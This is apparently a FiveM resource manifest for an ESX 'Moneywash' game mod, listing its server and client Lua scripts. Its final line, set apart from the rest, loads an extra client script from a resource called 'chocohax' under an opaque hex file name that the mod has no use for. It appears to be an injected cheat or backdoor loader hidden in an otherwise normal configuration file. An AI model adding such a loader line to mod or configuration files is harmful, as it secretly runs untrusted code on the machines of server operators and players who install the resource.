resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Moneywash'

version '0.0.1'

server_scripts {
  '@es_extended/locale.lua',
  '@mysql-async/lib/MySQL.lua',
  'server/main.lua'
}

client_scripts {
  '@es_extended/locale.lua',
  'client/main.lua'
}
client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'